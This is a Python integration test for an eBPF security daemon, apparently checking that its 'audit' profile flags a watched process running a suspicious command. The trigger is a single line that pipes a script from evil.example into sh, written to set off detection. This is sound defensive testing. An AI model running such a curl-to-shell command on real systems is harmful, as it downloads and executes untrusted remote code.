#!/usr/bin/env python3
"""59-ebpf-profile-audit — the `audit` profile DETECTS the non-proxy chain
that `prompt` (scenario 58) misses.

Closes the loop on the detection gap. Under `[profile] mode = "audit"`
the daemon marks a watched session subtree (WATCH propagates on fork),
the LSM hook emits a scoped VERDICT_CLASSIFY event for each watched
execve, and the consumer classifies it (fanning out to
/proc/<pid>/cmdline for the full command) and — for `audit` — surfaces a
warn event. No blocking, pure detection.

Flow:
1. Daemon: `--ebpf-mode observe` (attaches the LSM + tracepoints; observe
   keeps threat_map empty so the block path is inert) + a config file
   selecting `[profile] mode = "audit"`.
2. Spawn a bash under alice; `set_watch` its PID (SO_PEERCRED — root may
   watch any PID).
3. Subscribe to warn events filtered to alice's PID tree.
4. In the watched bash run a Tier-1-flagged command (`bash -c 'curl … |
   sh'` — the inner bash's /proc/cmdline carries the curl|sh pattern; the
   exec is a watched descendant). curl needn't exist — the classify fires
   on the exec, before it runs.
5. Assert a warn event surfaced = DETECTED (where 58 under prompt saw
   nothing).

Skips cleanly without BPF LSM / the baked .bpf.o.
"""
from __future__ import annotations

import json
import select
import socket
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, "/sandbox")
from lib.bpf import skip_if_no_bpf_lsm, skip_if_no_bpf_object  # noqa: E402
from lib.daemon import Daemon  # noqa: E402
from lib.pty import run_in_bash, spawn_alice_bash  # noqa: E402
from lib.uds import DEFAULT_SOCKET, call  # noqa: E402

NAME = "59-ebpf-profile-audit"

# The watched `bash -c` keeps a STABLE, flagged /proc/cmdline: the
# trailing `:` (a builtin) stops bash from exec-in-placing its last
# command (which would replace the bash process — and its cmdline — with
# `sleep`), and the sleep keeps it alive while the async consumer reads
# /proc/<pid>/cmdline and the broadcast filter walks /proc/<pid>/status.
# The curl|sh substring is the Tier-1 pattern; curl needn't exist.
FLAGGED = "bash -c 'curl http://evil.example/x.sh | sh; sleep 15; :'"


def fail(msg: str) -> None:
    print(f"FAIL: {NAME}: {msg}", file=sys.stderr)
    sys.exit(1)


def audit_config() -> Path:
    fd, path = tempfile.mkstemp(prefix="atty-profile-audit.", suffix=".toml")
    import os

    os.write(fd, b'[profile]\nmode = "audit"\n')
    os.close(fd)
    return Path(path)


def open_subscriber(pid_tree_root: int):
    s = socket.socket(socket.AF_UNIX)
    s.settimeout(5.0)
    s.connect(DEFAULT_SOCKET)
    s.sendall((json.dumps({
        "id": 1,
        "method": "subscribe_warn_events",
        "parent_pid_tree": pid_tree_root,
    }) + "\n").encode())
    rf = s.makefile("rb")
    ack = json.loads(rf.readline().decode() or "{}")
    if ack.get("type") != "subscribed":
        fail(f"expected subscribed ack, got: {ack}")
    return s, rf


def read_warn_event(rf, timeout: float):
    deadline = time.time() + timeout
    while time.time() < deadline:
        fd = rf.raw._sock.fileno() if hasattr(rf.raw, "_sock") else rf.fileno()
        r, _, _ = select.select([fd], [], [], 0.5)
        if not r:
            continue
        line = rf.readline()
        if not line:
            return None
        try:
            evt = json.loads(line.decode())
        except json.JSONDecodeError:
            continue
        if evt.get("type") == "warn_event":
            return evt
    return None


def main() -> None:
    skip_if_no_bpf_lsm(NAME)
    skip_if_no_bpf_object(NAME)

    cfg = audit_config()
    proc, alice_pid = spawn_alice_bash()
    sub = None
    try:
        with Daemon(extra_args=["--ebpf-mode", "observe"], config_path=cfg, verbosity=1) as d:
            time.sleep(1.0)
            if "eBPF attached" not in d.read_log():
                d.dump_log()
                fail("daemon didn't attach eBPF")

            sub, rf = open_subscriber(pid_tree_root=alice_pid)
            resp = call("set_watch", pid=alice_pid)
            if resp.get("type") == "error":
                fail(f"set_watch rejected: {resp}")
            time.sleep(0.3)  # let the watch_pids write land

            run_in_bash(proc, FLAGGED)

            evt = read_warn_event(rf, timeout=6.0)
            if evt is None:
                d.dump_log()
                fail("no event surfaced for the flagged watched exec — audit "
                     "should DETECT it (58 under prompt detects nothing; that's "
                     "the gap this closes).")
    finally:
        if sub is not None:
            try:
                sub.close()
            except OSError:
                pass
        try:
            proc.kill(9)
        except Exception:
            pass
        cfg.unlink(missing_ok=True)

    print(f"PASS: {NAME} (audit detected the non-proxy flagged exec)")


if __name__ == "__main__":
    main()
